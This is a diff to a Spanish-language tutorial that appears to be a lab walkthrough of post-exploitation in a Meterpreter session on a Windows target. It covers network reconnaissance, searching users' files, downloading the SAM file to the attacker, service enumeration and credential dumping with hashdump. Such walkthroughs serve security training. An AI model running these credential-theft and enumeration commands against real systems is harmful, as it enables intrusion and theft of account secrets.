@@ -210,7 +210,9 @@ ps
 
 ![PS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782680088/PS_fhnbpb.png)
 
-### 4.1.4 Ver información de la red (IP, adaptadores, etc:
+## 4.2 Explorar la red desde dentro del target
+
+### 4.2.1 Ver información de la red (IP, adaptadores, etc):
 
 Ingresamos el siguiente comando:
 
@@ -220,15 +222,124 @@ ipconfig
 
 ![IPCONFIG](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782680296/IPCONFIG_updzdr.png)
 
+### 4.2.2 Ver otros host activos en la red:
+
+Ingresamos el siguiente comando:
+
+```
+arp
+```
+
+![ARP](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782683351/ARP_fo8idm.png)
+
+### 4.2.3 Conexiones activas y puertos de escucha:
+
+Ingresamos el siguiente comando:
+
+```
+netstat
+```
+
+![NETSTAT](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782683540/NETSTAT_purdpq.png)
+
+### 4.2.4 Tabla de enrutamiento:
+
+Ingresamos el siguiente comando:
+
+```
+route
+```
+
+![ROUTE](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782684061/ROUTE_a8s3hy.png)
+
+## 4.3 Navegar el sistema de archivos
+### 4.3.1 Directorio actual:
+
+Ingresamos el siguiente comando:
+
+```
+pwd
+```
+
+![PWD](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782684957/PWD_ywpqqa.png)
+
+### 4.3.2 Listar archivos:
+
+Ingresamos el siguiente comando:
+
+```
+ls
+```
+
+![LS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782684984/LS_sicndj.png)
+
+### 4.3.3 Buscar archivos .txt en Users:
+
+Ingresamos el siguiente comando:
+
+```
+search -f *.txt -d C:\\Users
+```
+
+![SEARCH](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782685012/SEARCH_grlexl.png)
+
+### 4.3.4 Descargar archivos al atacante:
+
+Ingresamos el siguiente comando:
+
+```
+download C:\\Windows\\Temp\\SAM
+```
+
+![DOWNLOAD](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782685031/DOWNLOAD_smsssy.png)
+
+## 4.4 Enumerar servicios
+
+Para este paso ejecutaremos varios comandos que nos permitiran ver los servicios que tenemos, primero ingresamos al cmd.exe:
 
 
+```
+meterpreter > shell            # abrir cmd.exe en el target
+```
 
+Una vez dentro:
 
+### 4.4.1 Listar servicios en ejecución:
 
+Ingresamos el siguiente comando:
 
+```
+C:\> net start
+```
 
+![NET START](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782685716/NET_START_rrxqcw.png)
 
+### 4.4.2 Listar servicios en ejecución:
 
+Ingresamos el siguiente comando:
 
+```
+C:\> sc query type= all
+```
 
+![SC QUERY](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782685738/SC_QUERY_oap894.png)
 
+### 4.4.3 Conexiones con PID asociado:
+
+Ingresamos el siguiente comando:
+
+```
+C:\> netstat -ano  
+```
+
+![NETSTAT -ANO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782685895/NETSTAT-ANO_nssyz0.png)
+
+## 4.5 Extraer credenciales
+
+Ingresamos el siguiente comando para ello:
+
+```
+meterpreter > hashdump
+```
+
+![HASHDUMP](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782686219/HASHDUMP_gfhswr.png)
